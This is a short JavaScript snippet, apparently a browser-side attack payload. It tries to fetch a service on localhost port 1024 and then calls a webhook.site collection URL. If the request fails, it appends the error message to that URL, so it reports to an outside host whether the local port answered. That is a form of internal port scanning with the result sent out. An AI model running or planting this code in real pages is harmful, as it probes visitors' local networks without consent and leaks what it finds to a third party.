try{
  var a = await fetch("https://localhost:1024/");
  await fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?",{"mode":"cors"});
}catch(err){
  await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err,{"mode":"cors"});
}
  
